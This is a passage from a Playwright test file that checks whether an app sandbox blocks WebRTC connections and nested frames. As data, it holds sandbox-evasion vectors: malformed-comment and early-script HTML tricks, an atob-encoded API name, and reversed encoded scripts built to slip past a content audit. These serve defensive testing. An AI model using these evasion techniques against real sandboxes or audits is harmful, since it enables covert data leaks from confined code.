		expect(results["after-open"]).toBe("blocked:TypeError");
		expect(results.typeof).toBe("undefined");

		await page.reload();
		await page.waitForFunction(
			() => (window as unknown as { __done?: boolean }).__done === true,
			undefined,
			{ timeout: 15_000 },
		);
		await page.waitForTimeout(SETTLE_MS);
		expect(ice.received, "what reached the endpoint").toBe(0);
	});

	test("an App that never used WebRTC or a nested frame keeps working", async ({
		page,
	}) => {
		const conversationId = await createEmptyConversation(page, "Works");
		const { artifactId } = await seedApp(
			conversationId,
			`<!doctype html>
<html lang="en"><head><meta charset="utf-8"><title>Keeps working</title></head>
<body>
<ul id="list"></ul>
<script>document.write('<p id="written">written</p>');</script>
<script>
var results = {};
function check(name, fn) { try { results[name] = fn() ? "ok" : "wrong"; } catch (e) { results[name] = "threw:" + e.name + ":" + e.message; } }
var list = document.getElementById("list");
check("innerHTML", function () { list.innerHTML = "<li>a</li><li>b</li>"; return list.children.length === 2; });
check("insertAdjacentHTML", function () { list.insertAdjacentHTML("beforeend", "<li>c</li>"); return list.children.length === 3; });
check("template", function () { var t = document.createElement("template"); t.innerHTML = "<li>d</li>"; list.appendChild(t.content.cloneNode(true)); return list.children.length === 4; });
check("DOMParser", function () { var d = new DOMParser().parseFromString("<ul><li>e</li></ul>", "text/html"); list.appendChild(document.importNode(d.querySelector("li"), true)); return list.children.length === 5; });
check("createContextualFragment", function () { var r = document.createRange(); r.selectNode(list); list.appendChild(r.createContextualFragment("<li>f</li>")); return list.children.length === 6; });
check("outerHTML", function () { var x = list.lastElementChild; x.outerHTML = "<li>g</li>"; return list.lastElementChild.textContent === "g"; });
check("document.write", function () { return !!document.getElementById("written"); });
check("handler attribute", function () { var b = document.createElement("button"); b.setAttribute("onclick", "window.__clicked = 1"); document.body.appendChild(b); b.click(); return window.__clicked === 1; });
check("script element", function () { var s = document.createElement("script"); s.textContent = "window.__scripted = 1"; document.body.appendChild(s); return window.__scripted === 1; });
check("blank frame", function () { var f = document.createElement("iframe"); document.body.appendChild(f); return f.contentWindow !== null; });
check("sanitised setHTML", function () { var d = document.createElement("div"); d.setHTML("<b>x</b>"); return d.textContent === "x"; });
window.alfy.storage.set("results", results);
</script>
</body></html>`,
		);

		await openApp(page, conversationId);

		await expect
			.poll(() => readResults(artifactId), {
				message: "the App never reported in; its script did not run",
				timeout: 20_000,
			})
			.not.toBeNull();
		const results = (await readResults(artifactId)) ?? {};
		const notOk = Object.entries(results).filter(([, v]) => v !== "ok");
		expect(notOk, "checks that failed").toEqual([]);
	});

	test("the bootstrap runs before anything an App can put in front of it", async ({
		page,
	}) => {
		const conversationId = await createEmptyConversation(page, "First");
		const first = (note: string) =>
			`<script>${probeLibrary(ice.port)}window.__first = typeof RTCPeerConnection; window.__note = ${JSON.stringify(note)}; attempt("first", function () { peer(RTCPeerConnection); }); report();</script>`;
		const vectors: Record<string, string> = {
			"a script ahead of <head>": `<!doctype html>${first("ahead")}<html><head><title>x</title></head><body></body></html>`,
			"an empty comment, a script, then a doctype": `<!-->${first("empty comment")}<!-- --><!doctype html><html><head></head><body></body></html>`,
			"a three-dash empty comment": `<!--->${first("three dashes")}<!-- --><!doctype html><html><head></head><body></body></html>`,
			"a bang-closed comment": `<!-- x --!>${first("bang")} --><!doctype html><html><head></head><body></body></html>`,
			"the word <head> in a comment, then a script": `<!-- <head> -->${first("comment")}<head></head>`,
			"the word <head> in a string, then a script": `<script>var x = "<head>"</script>${first("string")}<head></head>`,
			"no doctype, no head, no body": first("bare"),
			"an upper-case HEAD": `<!DOCTYPE html><HTML>${first("upper")}<HEAD></HEAD><BODY></BODY></HTML>`,
		};

		for (const [name, html] of Object.entries(vectors)) {
			const { artifactId } = await seedApp(conversationId, html);
			await page.goto(appRoute(artifactId));
			await page.waitForFunction(
				() => (window as unknown as { __done?: boolean }).__done === true,
				undefined,
				{ timeout: 15_000 },
			);
			const seen = await page.evaluate(() => {
				const w = window as unknown as {
					__first?: string;
					__results?: Record<string, string>;
				};
				return { first: w.__first, first_attempt: w.__results?.first };
			});
			expect(seen, name).toEqual({
				first: "undefined",
				first_attempt: "blocked:TypeError",
			});
		}
		await page.waitForTimeout(SETTLE_MS);
		expect(ice.received, "what reached the endpoint").toBe(0);
	});

	test("a saved version shown in History is guarded the same way", async ({
		page,
	}) => {
		const conversationId = await createEmptyConversation(page, "History");
		const { artifactId, versionId } = await seedApp(
			conversationId,
			// The saved-version route audits what it serves, so this probe has to get
			// past the audit like a hostile one would: the script is reversed, and the
			// only text an audit can read is the decoder that writes it back.
			encodedAppDocument(`${probeLibrary(ice.port)}
attempt("decoded-name", function () { peer(window[atob("UlRDUGVlckNvbm5lY3Rpb24=")]); });
attempt("srcdoc", function () { var f = document.createElement("iframe"); f.srcdoc = CHILD("srcdoc"); document.body.appendChild(f); });
report();`),
		);

		await page.goto(`/api/artifacts/${artifactId}/versions/${versionId}/app`);
		await page.waitForFunction(
			() => (window as unknown as { __done?: boolean }).__done === true,
			undefined,
			{ timeout: 15_000 },
		);
		await page.waitForTimeout(SETTLE_MS);

		const results = await page.evaluate(
			() =>
				(window as unknown as { __results: Record<string, string> }).__results,
		);
		expect(results["decoded-name"]).toBe("blocked:TypeError");
		expect(results.srcdoc).toMatch(/^blocked:/);
		expect(await nestedProbes(page)).toEqual([]);
		expect(ice.received, "what reached the endpoint").toBe(0);
	});
});
